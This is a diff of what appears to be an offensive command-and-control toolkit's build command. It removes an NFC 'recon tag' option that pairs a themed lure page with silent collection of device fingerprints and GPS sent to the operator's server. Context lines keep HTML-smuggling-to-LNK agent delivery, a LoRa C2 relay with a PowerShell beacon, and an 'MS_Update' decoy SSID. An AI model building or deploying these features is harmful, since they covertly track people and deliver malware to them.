@@ -741,16 +741,6 @@ def cmd_build(args, cfg, ws):
         build_nfc_wifi_payload(nfc_wifi_ssid, nfc_wifi_pass, nfc_wifi_out)
         did_something = True
 
-    # ── NFC device recon tag ─────────────────────────────────────────────────
-    if getattr(args, "nfc_recon", False):
-        from builders.nfc_recon import build_nfc_recon_payload
-        nfc_recon_out   = getattr(args, "nfc_recon_out",   None) or ws.path("nfc")
-        nfc_recon_theme = getattr(args, "nfc_recon_theme", "wifi")
-        tag_url     = f"https://{lhost}:{port}/nfc/collect.html"
-        collect_url = f"https://{lhost}:{port}/collect"
-        build_nfc_recon_payload(tag_url, collect_url, nfc_recon_out, theme=nfc_recon_theme)
-        did_something = True
-
     # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
     if getattr(args, "smuggle", None) is not None:
         tname = args.smuggle or "__c2_agent__"
@@ -1596,12 +1586,6 @@ def main():
                          help="WPA2 passphrase for NFC WiFi Handover tag (default: lora_pass from config)")
     build_p.add_argument("--nfc-wifi-out",  metavar="DIR",  dest="nfc_wifi_out",  default=None,
                          help="Output directory for WiFi Handover NDEF (default: <workspace>/nfc/)")
-    build_p.add_argument("--nfc-recon",       action="store_true", dest="nfc_recon",
-                         help="Generate NFC recon tag: tap → silent device fingerprint + GPS → C2 (two-phase collection)")
-    build_p.add_argument("--nfc-recon-theme", metavar="THEME",     dest="nfc_recon_theme", default="wifi",
-                         help="Lure page theme: wifi|parking|delivery  (default: wifi)")
-    build_p.add_argument("--nfc-recon-out",   metavar="DIR",       dest="nfc_recon_out",   default=None,
-                         help="Output directory for NFC recon files (default: <workspace>/nfc/)")
     build_p.add_argument("--lora",         action="store_true", dest="lora",
                          help="Generate LoRa C2 relay kit: T-Embed Plus WiFi AP + LoRa bridge + PS1 beacon loop")
     build_p.add_argument("--lora-ssid",    metavar="SSID",  dest="lora_ssid",   default="MS_Update",
